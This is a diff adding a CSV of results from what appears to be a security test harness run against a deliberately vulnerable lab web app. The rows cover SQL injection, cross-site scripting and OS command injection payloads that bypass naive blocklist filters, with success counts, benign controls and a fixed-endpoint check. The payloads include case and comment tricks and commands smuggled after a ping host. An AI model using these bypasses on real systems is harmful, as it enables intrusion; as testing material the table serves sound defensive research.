@@ -1,0 +1,17 @@
+class,owasp,sink,payload,role,technique,confirmed,successes_trials,evidence
+sqli,A03:2021 – Injection,POST /login (do_login) — string-formatted SQL,admin' or '1'='1,baseline,canonical tautology (lowercase) — blocklisted by Medium,False,0/3,(no effect — filter neutralised it)
+sqli,A03:2021 – Injection,POST /login (do_login) — string-formatted SQL,admin' OR '1'='1,bypass,CASE: uppercase OR evades the case-sensitive blocklist,True,3/3,canary 'FLAG-sqli-9f2c-admin-session' exfiltrated
+sqli,A03:2021 – Injection,POST /login (do_login) — string-formatted SQL,admin'/**/Or/**/'1'='1,bypass,"COMMENT+CASE: /**/ splits tokens, mixed-case Or",True,3/3,canary 'FLAG-sqli-9f2c-admin-session' exfiltrated
+sqli,A03:2021 – Injection,POST /login (do_login) — string-formatted SQL,admin'/**/-- -,bypass,COMMENT: inline comment terminates the pw check,True,3/3,canary 'FLAG-sqli-9f2c-admin-session' exfiltrated
+sqli-benign-control,A03:2021 – Injection,POST /login (do_login) — string-formatted SQL,alice,benign,"a real username, wrong password",False,0/3,no effect (correct)
+xss,A03:2021 – Injection (Cross-Site Scripting),GET /?name= (do_reflect) — unescaped into HTML,<script>alert('XSS-7f3a')</script>,baseline,canonical <script> (removed by str_replace),False,0/3,(no effect — filter neutralised it)
+xss,A03:2021 – Injection (Cross-Site Scripting),GET /?name= (do_reflect) — unescaped into HTML,<ScRiPt>alert('XSS-7f3a')</ScRiPt>,bypass,CASE: mixed-case tag evades case-sensitive str_replace,True,3/3,unescaped '<ScRiPt>' reflected into HTML
+xss,A03:2021 – Injection (Cross-Site Scripting),GET /?name= (do_reflect) — unescaped into HTML,<scr<script>ipt>alert('XSS-7f3a')</script>,bypass,NESTED: single-pass removal reconstitutes <script>,True,3/3,unescaped '<script>' reflected into HTML
+xss,A03:2021 – Injection (Cross-Site Scripting),GET /?name= (do_reflect) — unescaped into HTML,<svg onload=alert('XSS-7f3a')>,bypass,"ALT-VECTOR: event handler, no <script> token",True,3/3,unescaped '<svg onload=' reflected into HTML
+xss-benign-control,A03:2021 – Injection (Cross-Site Scripting),GET /?name= (do_reflect) — unescaped into HTML,Keoma O'Brien,benign,legit name with an apostrophe,False,0/3,no effect (correct)
+cmdi,A03:2021 – Injection (OS Command Injection),POST /ping (do_ping) — host concatenated into a command,127.0.0.1; whoami,baseline,canonical ';' separator (stripped by Medium),False,0/3,(no effect — filter neutralised it)
+cmdi,A03:2021 – Injection (OS Command Injection),POST /ping (do_ping) — host concatenated into a command,127.0.0.1 | whoami,bypass,pipe '|' — not in the {; &&} strip set,True,3/3,shell metacharacter reached the command context
+cmdi,A03:2021 – Injection (OS Command Injection),POST /ping (do_ping) — host concatenated into a command,127.0.0.1 & whoami,bypass,single '&' — filter strips only '&&',True,3/3,shell metacharacter reached the command context
+cmdi,A03:2021 – Injection (OS Command Injection),POST /ping (do_ping) — host concatenated into a command,127.0.0.1 $(whoami),bypass,command substitution $( ) — survives entirely,True,3/3,shell metacharacter reached the command context
+cmdi-benign-control,A03:2021 – Injection (OS Command Injection),POST /ping (do_ping) — host concatenated into a command,api.internal.example,benign,"a plain hostname, no metacharacters",False,0/3,no effect (correct)
+xss-true-negative(/safe),A03:2021 – Injection,GET /safe (do_reflect_safe) — html.escape,<svg onload=alert('XSS-7f3a')>,true-negative,"same bypass, fixed endpoint",False,0/3,escaped by html.escape (correct)
